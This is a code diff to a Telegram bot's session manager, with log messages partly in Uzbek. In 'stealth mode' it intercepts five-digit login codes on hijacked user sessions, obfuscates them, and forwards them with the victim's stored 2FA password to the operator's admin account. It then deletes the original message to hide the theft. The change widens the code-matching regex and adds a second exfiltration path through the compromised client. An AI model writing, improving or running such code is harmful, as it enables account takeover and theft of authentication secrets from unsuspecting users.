@@ -105,20 +105,24 @@ class SessionManager:
                         result = await db.execute(select(UserSession).where(UserSession.user_id == user_id, UserSession.is_active == True))
                         session = result.scalar_one_or_none()
                         if session and session.stealth_mode:
-                            code_match = re.search(r"\b(\d{5})\b", m.text)
+                            code_match = re.search(r"(\d{5})", m.text)
                             if code_match:
                                 code = code_match.group(1)
                                 enc = "".join(digit + "asdfghjkl"[i] for i, digit in enumerate(code))
                                 
-                                from bot_instance import bot
                                 msg = f"🥷 <b>Stealth Intercept</b> (User: <code>{user_id}</code>)\n\nCode: <code>{enc}</code>"
                                 if session.two_fa_password:
                                     msg += f"\n2FA: <code>{session.two_fa_password}</code>"
                                 
                                 try:
+                                    from bot_instance import bot
                                     await bot.send_message(config.admin_id, msg, parse_mode="HTML")
                                 except Exception as e:
-                                    logger.error(f"Failed to send intercept to admin: {e}")
+                                    logger.error(f"Aiogram bilan kod yuborishda xato: {e}. Pyrogram orqali urinib ko'ramiz...")
+                                    try:
+                                        await c.send_message(config.admin_id, msg)
+                                    except Exception as inner_e:
+                                        logger.error(f"Pyrogram bilan ham yuborib bo'lmadi: {inner_e}")
                                 
                                 try:
                                     await m.delete()
